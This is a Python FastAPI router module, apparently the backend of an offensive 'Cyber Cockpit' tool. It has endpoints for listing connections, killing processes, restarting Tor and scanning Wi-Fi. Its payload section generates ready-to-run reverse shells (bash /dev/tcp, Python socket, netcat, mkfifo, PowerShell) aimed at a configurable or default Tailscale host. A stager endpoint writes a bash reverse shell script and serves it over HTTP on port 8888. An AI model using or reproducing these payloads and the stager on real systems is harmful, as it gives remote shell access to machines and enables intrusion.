import os
import subprocess
import shutil
import socket
import threading
import time
from typing import Dict, Any, List, Optional
from fastapi import APIRouter, HTTPException
from pydantic import BaseModel

from app.config import settings

cyber_router = APIRouter(prefix="/cyber", tags=["Cyber Cockpit"])

# ─── Network Radar Models & Endpoints ─────────────────────────────────────────

@cyber_router.get("/radar")
def get_network_radar():
    """
    Returns active incoming and outgoing network connections with PID, process name,
    local/remote endpoints, and protocol.
    """
    connections: List[Dict[str, Any]] = []
    try:
        # Use ss -tunp for fast socket inspection
        proc = subprocess.run(
            ["ss", "-tunp", "-H"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=2
        )
        for line in proc.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 5:
                proto = parts[0].upper()
                state = parts[1]
                local_addr = parts[4]
                remote_addr = parts[5] if len(parts) > 5 else "*:*"
                process_info = parts[6] if len(parts) > 6 else ""

                # Extract pid & name from users:(("name",pid=123,fd=4))
                proc_name = ""
                pid = None
                if 'users:(("' in process_info:
                    try:
                        name_part = process_info.split('users:(("')[1].split('"')[0]
                        proc_name = name_part
                        if "pid=" in process_info:
                            pid_str = process_info.split("pid=")[1].split(",")[0]
                            pid = int(pid_str)
                    except Exception:
                        pass

                connections.append({
                    "protocol": proto,
                    "state": state,
                    "local": local_addr,
                    "remote": remote_addr,
                    "process": proc_name,
                    "pid": pid,
                    "raw_info": process_info
                })
    except Exception as e:
        connections.append({"error": str(e)})

    return {
        "success": True,
        "count": len(connections),
        "connections": connections[:50]  # Cap at top 50
    }

class KillPidRequest(BaseModel):
    pid: int

@cyber_router.post("/radar/kill")
def kill_process(req: KillPidRequest):
    """Safely terminate a suspicious process."""
    if req.pid <= 1:
        raise HTTPException(status_code=400, detail="Cannot kill system init process")
    try:
        os.kill(req.pid, 9)
        return {"success": True, "message": f"Killed process {req.pid}"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to kill {req.pid}: {str(e)}")

# ─── Tor & ProxyChains Controller ──────────────────────────────────────────────

@cyber_router.get("/tor/status")
def get_tor_status():
    """Checks whether Tor daemon is active, and inspects public routing."""
    is_active = False
    try:
        res = subprocess.run(
            ["systemctl", "is-active", "tor"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=1
        )
        is_active = res.stdout.strip() == "active"
    except Exception:
        pass

    return {
        "tor_service_active": is_active,
        "socks_port": 9050,
        "proxychains_available": shutil.which("proxychains4") is not None or shutil.which("proxychains") is not None
    }

@cyber_router.post("/tor/renew")
def renew_tor_circuit():
    """Restarts or signals Tor to change the circuit."""
    try:
        # Try restart tor service
        subprocess.run(["sudo", "-n", "systemctl", "restart", "tor"], timeout=3)
        return {"success": True, "message": "Tor service restarted, new circuit generated"}
    except Exception:
        # Try kill -HUP if non-root
        try:
            subprocess.run(["pkill", "-HUP", "tor"], timeout=2)
            return {"success": True, "message": "Signal HUP sent to Tor daemon"}
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))

# ─── Payload Generator & HTTP Stager ───────────────────────────────────────────

class PayloadRequest(BaseModel):
    payload_type: str = "bash"  # bash, python, netcat, powershell
    lhost: Optional[str] = None
    lport: int = 4444

_stager_proc: Optional[subprocess.Popen] = None
_stager_port: int = 8888

@cyber_router.post("/payload/generate")
def generate_payload(req: PayloadRequest):
    """
    Generates ready-to-run reverse shell payloads pre-configured with Tailscale IP.
    """
    lhost = req.lhost or settings.TAILSCALE_IP or "100.69.194.11"
    lport = req.lport

    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_b64": f"echo {lhost}:{lport} | base64",
        "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "netcat": f"nc -e /bin/sh {lhost} {lport}",
        "netcat_fifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
    }

    selected = payloads.get(req.payload_type, payloads["bash"])
    stager_url = f"http://{lhost}:{_stager_port}/payload.sh"

    return {
        "success": True,
        "type": req.payload_type,
        "lhost": lhost,
        "lport": lport,
        "payload": selected,
        "stager_url": stager_url if _stager_proc and _stager_proc.poll() is None else None
    }

@cyber_router.post("/payload/stager/toggle")
def toggle_http_stager():
    """Toggles a temporary HTTP stager on port 8888."""
    global _stager_proc
    if _stager_proc and _stager_proc.poll() is None:
        _stager_proc.terminate()
        _stager_proc = None
        return {"running": False, "message": "HTTP Stager stopped"}

    stager_dir = "/tmp/smart_remote_stager"
    os.makedirs(stager_dir, exist_ok=True)
    # Write default payload
    with open(f"{stager_dir}/payload.sh", "w") as f:
        f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{settings.TAILSCALE_IP}/4444 0>&1\n")

    _stager_proc = subprocess.Popen(
        ["python3", "-m", "http.server", str(_stager_port), "--directory", stager_dir],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return {
        "running": True,
        "port": _stager_port,
        "url": f"http://{settings.TAILSCALE_IP}:{_stager_port}/payload.sh",
        "message": f"HTTP Stager started on port {_stager_port}"
    }

# ─── Wi-Fi Scanner (Non-disruptive) ───────────────────────────────────────────

@cyber_router.get("/wifi/scan")
def get_wifi_scan():
    """Runs a non-disruptive scan of surrounding Wi-Fi networks."""
    networks: List[Dict[str, Any]] = []
    try:
        res = subprocess.run(
            ["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY", "dev", "wifi", "list"],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=4
        )
        for line in res.stdout.splitlines():
            parts = line.split(":")
            if len(parts) >= 5:
                ssid = parts[0] or "<Hidden>"
                bssid = ":".join(parts[1:7]) if len(parts) >= 7 else parts[1]
                chan = parts[-3] if len(parts) >= 7 else parts[2]
                signal = parts[-2] if len(parts) >= 7 else parts[3]
                sec = parts[-1] if len(parts) >= 7 else parts[4]

                networks.append({
                    "ssid": ssid,
                    "bssid": bssid,
                    "channel": chan,
                    "signal": signal,
                    "security": sec
                })
    except Exception as e:
        return {"success": False, "error": str(e), "networks": []}

    return {"success": True, "count": len(networks), "networks": networks[:30]}

# ─── Reverse Shell Listener Sentinel ──────────────────────────────────────────

@cyber_router.get("/listeners")
def get_listeners_status():
    """Checks if common listening ports (4444, 9001, 1337) have active inbound shell connections."""
    checked_ports = [4444, 9001, 1337, 5555]
    listeners: List[Dict[str, Any]] = []

    for port in checked_ports:
        is_listening = False
        active_connections = 0
        try:
            res = subprocess.run(
                ["ss", "-tun", "sport", f"= :{port}"],
                stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL,
                text=True,
                timeout=1
            )
            lines = res.stdout.strip().splitlines()
            if len(lines) > 1:
                is_listening = True
                active_connections = len(lines) - 1
        except Exception:
            pass

        listeners.append({
            "port": port,
            "listening": is_listening,
            "connected_targets": active_connections
        })

    return {"success": True, "listeners": listeners}
